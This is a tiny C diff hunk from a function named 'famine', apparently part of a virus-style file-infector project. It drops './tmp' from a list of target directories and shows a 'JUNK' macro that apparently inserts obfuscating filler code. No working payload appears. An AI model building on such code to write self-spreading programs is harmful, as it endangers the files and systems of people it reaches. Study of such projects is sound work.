@@ -278,7 +278,6 @@ void	famine(bootstrap_data_t *bs_data, uint16_t *counter)
 	char *paths[] = {
 		STR(PATH1),
 		STR(PATH2),
-		STR("./tmp"),
 		NULL
 	}; JUNK;
 
